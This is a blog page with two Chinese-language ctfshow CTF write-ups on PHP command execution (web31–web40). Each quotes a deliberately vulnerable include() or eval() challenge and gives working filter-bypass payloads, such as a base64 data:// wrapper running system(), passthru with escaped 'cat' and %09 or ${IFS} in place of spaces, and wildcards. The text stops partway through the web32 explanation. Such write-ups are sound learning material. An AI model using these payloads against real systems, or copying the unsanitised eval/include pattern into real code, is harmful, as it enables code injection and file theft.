<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-hack/ctfshow/web入门/命令执行/ctfshow-web入门系列-命令执行-web37-web44" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web37-web44/" class="article-date">
  <time class="dt-published" datetime="2024-10-01T03:59:00.000Z" itemprop="datePublished">2024-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/hack/">hack</a>►<a class="article-category-link" href="/categories/hack/ctfshow/">ctfshow</a>►<a class="article-category-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/">web入门</a>►<a class="article-category-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web37-web44/">ctfshow-web入门系列-命令执行-web37-web44</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h2><p>首先这题开始文件包含了，如果想执行命令，只能依赖php:&#x2F;&#x2F;input或者data协议去执行php代码<br>这题过滤了flag关键字，我希望能通过这道题练一下data:&#x2F;&#x2F;text&#x2F;&#x2F;plain协议的base64编码的变体，这样可以在协议内部不包含flag关键字</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">system(&quot;tac flag.php&quot;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="环境说明-1"><a href="#环境说明-1" class="headerlink" title="环境说明"></a>环境说明</h2><p>由于是文件包含函数的过滤</p>
<ul>
<li>伪协议过滤<ul>
<li>file:/&#x2F;</li>
</ul>
</li>
<li>关键字<ul>
<li>flag</li>
<li>php</li>
</ul>
</li>
</ul>
<h2 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h2><p>使用data:&#x2F;&#x2F;text&#x2F;plain;base64去绕过关键字的过滤，或者仅仅对于flag的过滤使用通配符</p>
<h1 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="环境说明-2"><a href="#环境说明-2" class="headerlink" title="环境说明"></a>环境说明</h2><p>这题变体了，是含文件后缀限制的，我们的思路还是利用可以命令执行的伪协议，data:&#x2F;&#x2F;text&#x2F;plain和(php:&#x2F;&#x2F;input 这个在这里没法绕过限制，因为是get方式提交的php代码,php:&#x2F;&#x2F;input的代码是放在post里面的），在其中嵌入php代码的起始符和结束符，就可以绕过文件后缀名的限制了，例如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;data://text/plain,&lt;?php system(&quot;</span>tac fla?.php<span class="string">&quot;);?&gt;</span></span><br><span class="line"><span class="string">		&quot;</span>.<span class="string">&quot;.php&quot;</span>)</span><br><span class="line"><span class="comment">//等价于</span></span><br></pre></td></tr></table></figure>
<h2 id="原理解释"><a href="#原理解释" class="headerlink" title="原理解释"></a>原理解释</h2><p>include是包含了文件，如果是php代码，就可以执行<br>data:/&#x2F;text/plain能够将协议里的输入作为文件<br>&#x2F;&#x2F;text&#x2F;plain将文本作为文件，但是include中的文件如果有php代码就可以执行，所以成为了命令执行<br>真实写入的文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;tac fla?.php&quot;</span>);<span class="meta">?&gt;</span>php</span><br><span class="line"><span class="comment">// 文件后缀名的限制被字符串拼接data伪协议的文件内容里面了，</span></span><br><span class="line"><span class="comment">//由于?&gt;闭合了，php被忽略了</span></span><br></pre></td></tr></table></figure>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><h3 id="不可以使用data伪协议的编码"><a href="#不可以使用data伪协议的编码" class="headerlink" title="不可以使用data伪协议的编码"></a>不可以使用data伪协议的编码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=.php&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>拼接的.php将会干扰解码，因为data伪协议等于会对在url中编码的结果自动解码，然而.php是非编码部分</p>
<h1 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="环境说明-3"><a href="#环境说明-3" class="headerlink" title="环境说明"></a>环境说明</h2><ul>
<li>符号<ul>
<li>所有字符数字</li>
<li>~</li>
<li>`</li>
<li>@</li>
<li>#</li>
<li>$</li>
<li>%</li>
<li>^</li>
<li>&amp;</li>
<li>*</li>
<li>中文（</li>
<li>中文）</li>
<li>-</li>
<li>&#x3D;</li>
<li>+</li>
<li>{}</li>
<li>[]</li>
<li>:</li>
<li>‘</li>
<li>“</li>
<li>,</li>
<li>&lt;&gt;</li>
<li>.</li>
<li>&#x2F;</li>
<li>?</li>
<li>\(第一个转义是告诉php字符串有一个\开头（用于标明起始的匹配 ），第一个\的后面是要匹配的字符，同时要匹配的字符也要双写\,所以一共有四个)</li>
</ul>
</li>
</ul>
<h2 id="下一步，我该做些什么"><a href="#下一步，我该做些什么" class="headerlink" title="下一步，我该做些什么"></a>下一步，我该做些什么</h2><p>这道题把之前的日志注入和文件包含绕过的前提，$符号给过滤了，同时禁用了单双引号，分隔符上面只过滤了空格和超全局数组，php的终结符没法用了，bash的%0a换行仍然可用，引号的超全家数组替代也被过滤了（没法使用引号也自然没法执行系统命令），由于$被禁用，自己创建新的键也无望，因此，我们要引出一个知识点，无参数rce，仅仅依赖堆叠函数就可以找到自己想要的。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web37-web44/" data-id="cm1pwtvvm0000ecvh4r976in8" data-title="ctfshow-web入门系列-命令执行-web37-web44" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-hack/ctfshow/web入门/命令执行/ctfshow-web入门系列-命令执行-web29-web36" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/" class="article-date">
  <time class="dt-published" datetime="2024-10-01T03:59:00.000Z" itemprop="datePublished">2024-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/hack/">hack</a>►<a class="article-category-link" href="/categories/hack/ctfshow/">ctfshow</a>►<a class="article-category-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/">web入门</a>►<a class="article-category-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/">ctfshow-web入门系列-命令执行-web29-web36</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 关闭错误报告</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 检查是否通过 GET 参数传递了 &#x27;c&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// 获取 GET 参数 &#x27;c&#x27; 的值</span></span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h2><p>在不区分大小写的情况下”&#x2F;i”，正则表达式以’&#x2F;&#x2F;‘包裹匹配的字符串，结尾的i表示不区分大小写<br>过滤情况</p>
<ul>
<li>php函数<ul>
<li>system()</li>
<li>shell_exec()</li>
</ul>
</li>
<li>bash函数<ul>
<li>cat</li>
<li>sort</li>
</ul>
</li>
<li>文件名<ul>
<li>flag</li>
<li>php</li>
</ul>
</li>
<li>符号<ul>
<li>.</li>
<li>‘</li>
<li>空格</li>
</ul>
</li>
</ul>
<h2 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h2><p>选择执行系统命令或者选择执行php代码，当然，便于学习，最好两个都要学<br>ToDo:执行系统命令，找到php的shell入口</p>
<h3 id="shell入口在哪里"><a href="#shell入口在哪里" class="headerlink" title="shell入口在哪里"></a>shell入口在哪里</h3><p>我安装一定顺序去列出过滤情况，是不无道理的，希望能给自己思考过滤的时候形成一个网络图，php命令执行首先需要找到合适的php执行shell的函数，<img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-24_16-00-06.png" class="" title="Clip_2024-09-24_16-00-06.png"><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/meng-han/p/16735478.html">CTF之PHP命令执行 - hithub - 博客园 (cnblogs.com)</a><br>这里有最全的系统命令执行函数<br>选择passthru函数，这里刚刚入门，想起单引号被过滤，心一跳，😢那岂不是我无法在函数里面好好写命令了，但是哈哈哈，双引号没被过滤。</p>
<h2 id="下一步-1"><a href="#下一步-1" class="headerlink" title="下一步"></a>下一步</h2><p>ToDo:执行系统命令，找到php的shell入口</p>
<ul>
<li>完成:passthru(“”);<br>ToDo:执行什么系统命令</li>
</ul>
<h3 id="命令的思路在哪里"><a href="#命令的思路在哪里" class="headerlink" title="命令的思路在哪里"></a>命令的思路在哪里</h3><p>首先是获取目录的情况，我们需要使用ls命令，但是，点号的过滤使得目录穿梭成为了难题<br>?c&#x3D;passthru(“ls”);</p>
<img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-24_16-15-05.png" class="" title="Clip_2024-09-24_16-15-05.png">
<p>但是这道题直接把flag放在本目录了，点号过滤阻止目录穿梭并没有难到我们</p>
<h2 id="下一步-2"><a href="#下一步-2" class="headerlink" title="下一步"></a>下一步</h2><p>ToDo:执行系统命令，找到php的shell入口</p>
<ul>
<li>完成:passthru(“”);<br>ToDo:执行什么系统命令</li>
<li>完成:ls查看flag位置</li>
<li>ToDo:如何读到flag.php</li>
</ul>
<h3 id="糟糕，bash关键字被过滤了"><a href="#糟糕，bash关键字被过滤了" class="headerlink" title="糟糕，bash关键字被过滤了"></a>糟糕，bash关键字被过滤了</h3><p>虽然过滤了php后缀，也过滤了.的文件后缀名，我们可以使用*通配符去完成我们的任务。<br>通过特殊的拼接或者插入特殊符号去绕过的技巧一定要区分环境<br>所谓的绕过就是在不触发检查的环境下，最后却能在执行处生效<br>在这的思路是通过eval–&gt;php–&gt;bash，对应bash的命令，如cat，即使是过滤了，我们可以不急着尝试别的功能相似的函数去找到替代有两个技巧，插入两个单引号或者插入一个反斜杠就可以达到关键字过滤的绕过</p>
<img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-24_16-29-33.png" class="" title="Clip_2024-09-24_16-29-33.png">
<p>如果要尝试其他输出命令的函数<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/319567.html">CTF中命令执行常用知识点总结 - FreeBuf网络安全行业门户</a></p>
<img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-24_16-31-19.png" class="" title="Clip_2024-09-24_16-31-19.png">
<h3 id="空格也被过滤了"><a href="#空格也被过滤了" class="headerlink" title="空格也被过滤了"></a>空格也被过滤了</h3><img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-24_16-33-41.png" class="" title="Clip_2024-09-24_16-33-41.png">
<p>绕过过滤的技巧需要注意执行环境<br>有一次不小心用了&gt;，给flag输入了分号，看上去很怪，也说明他不能当空格，因为&gt;正常使用是重定位输出的</p>
<img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-24_16-36-25.png" class="" title="Clip_2024-09-24_16-36-25.png">
<ul>
<li>bash下<ul>
<li>$IFS  最好加上{}避免识别不到是引用$IFS</li>
<li>${IFS}</li>
<li>&lt;</li>
<li>&lt;&gt;</li>
<li>注意单个&gt;是不可以的</li>
<li>%09（tab）</li>
</ul>
</li>
<li>php下<ul>
<li>%09<br>这里讲解一下tab为何可以使用，首先他不能在正则表达式里面被过滤了，大概是两个空格的字符，%09是url编码的格式，服务器的超全局数组接受了就会解码的，注意他不是因为他传入preg的时候还是%09,传给$_GET[]就已经会自动url解码了，tab当然也能起类似于空格的分割的作用</li>
</ul>
</li>
</ul>
<h2 id="下一步-3"><a href="#下一步-3" class="headerlink" title="下一步"></a>下一步</h2><p>ToDo:执行系统命令，找到php的shell入口</p>
<ul>
<li>完成:passthru(“”);<br>ToDo:执行什么系统命令</li>
<li>完成:ls查看flag位置</li>
<li>ToDo:如何读到flag.php<ul>
<li>完成 ca\t&lt;&gt;f*</li>
</ul>
</li>
</ul>
<h2 id="passthru-“ca-tf-”"><a href="#passthru-“ca-tf-”" class="headerlink" title="passthru(“ca\t&lt;&gt;f*”);"></a>passthru(“ca\t&lt;&gt;f*”);</h2><p>在我自己的ubuntun22</p>
<img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-24_16-45-31.png" class="" title="Clip_2024-09-24_16-45-31.png">
<p>不过在靶机上面会出现一点小插曲，居然创建文件了</p>
<img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-24_16-46-44.png" class="" title="Clip_2024-09-24_16-46-44.png">
<p>那么就使用%09去代替空格把<br>同时还是要注意，ca\t,不要只加一个反斜杠，可能把\t识别成转义符了<br>c\a\t%09f*能成功，&lt;&gt;这个我在bash里面能够成功使用，但是这道题靶机失效了</p>
<h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="环境说明-1"><a href="#环境说明-1" class="headerlink" title="环境说明"></a>环境说明</h2><p>过滤情况</p>
<ul>
<li>php函数<ul>
<li>system</li>
<li>shell_exec</li>
<li>echo</li>
</ul>
</li>
<li>bash函数<ul>
<li>echo</li>
<li>cat</li>
<li>sort</li>
</ul>
</li>
<li>符号<ul>
<li>.</li>
<li>‘</li>
<li>`</li>
<li>;</li>
<li>(</li>
<li>空格</li>
</ul>
</li>
<li>文件名<ul>
<li>flag</li>
<li>php</li>
</ul>
</li>
</ul>
<h2 id="下一步-4"><a href="#下一步-4" class="headerlink" title="下一步"></a>下一步</h2><p>执行系统命令？括号和分号（虽然在bash中，由于%0a是换行符，可以作为bash终结符，但是括号没了，可不行啊）被过滤了，执行系统命令成为难题<br>所以，这题大概率是要执行php的函数<br>ToDo：什么php函数没有括号？</p>
<h2 id="文件包含的函数可以仅仅依赖引号"><a href="#文件包含的函数可以仅仅依赖引号" class="headerlink" title="文件包含的函数可以仅仅依赖引号"></a>文件包含的函数可以仅仅依赖引号</h2><img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-24_23-44-01.png" class="" title="Clip_2024-09-24_23-44-01.png">
<p>我们可以</p>
